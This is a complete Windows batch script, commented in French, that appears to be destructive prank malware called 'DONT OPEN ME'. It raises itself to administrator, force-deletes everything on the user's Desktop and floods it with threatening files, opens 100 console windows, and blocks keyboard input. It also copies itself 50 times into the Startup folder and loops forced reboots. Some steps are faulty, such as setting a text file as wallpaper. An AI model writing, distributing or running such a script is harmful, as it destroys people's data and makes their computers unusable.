@echo off
:: Vérification des droits d'administrateur
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: Masquer la fenêtre pour rendre le script plus menaçant
powershell -WindowStyle Hidden -Command ""

:: Mettre le volume au maximum
powershell -Command "(New-Object -ComObject SAPI.SPVoice).Speak('Attention')"

:: Suppression de tous les fichiers sur le bureau
set desktop=%userprofile%\Desktop
del /f /q "%desktop%\*" >nul 2>&1
rmdir /s /q "%desktop%" >nul 2>&1

:: Remplir le bureau avec des fichiers menaçants
for /l %%i in (1,1,100) do (
    echo YOU SHOULD NOT HAVE OPENED THIS... > "%desktop%\DONT_OPEN_ME_IS_HERE_%%i.txt"
)

:: Lancer des fenêtres CMD en boucle avec des messages troublants
for /l %%i in (1,1,100) do (
    start cmd /k "color 4 & echo ******************************************* & echo ** YOU CAN'T ESCAPE DONT OPEN ME IS HERE ** & echo ******************************************* & pause"
)

:: Sons stridents et alarmes en boucle
:start_sounds
(for /l %%i in () do (
    powershell -Command "[console]::beep(500,500)"
    powershell -Command "[console]::beep(1000,500)"
    powershell -Command "[console]::beep(1500,500)"
)) | cmd

:: Changer l'arrière-plan du bureau pour ajouter à la peur
set warning_file=%userprofile%\Desktop\WARNING.txt
echo !!! VOUS ÊTES CONTRÔLÉ PAR DONT OPEN ME !!! > "%warning_file%"
echo VOTRE SYSTÈME EST MAINTENANT INUTILE. >> "%warning_file%"
echo C'ÉTAIT INÉVITABLE. >> "%warning_file%"
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%warning_file%" /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters

:: Désactivation temporaire du clavier
rundll32 user32.dll,BlockInput 1
timeout /t 15 >nul
rundll32 user32.dll,BlockInput 0

:: Ajouter le script au démarrage 50 fois
set startup_folder=%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
for /l %%i in (1,1,50) do (
    setlocal enabledelayedexpansion
    set random_name=!random!!random!
    copy "%~f0" "%startup_folder%\DONT_OPEN_ME_!random_name!.bat"
    endlocal
)

:: Redémarrage constant avec un message final terrifiant
:loop
msg * "DONT OPEN ME IS EVERYWHERE. YOU CAN'T ESCAPE."
shutdown /r /f /t 15
goto loop
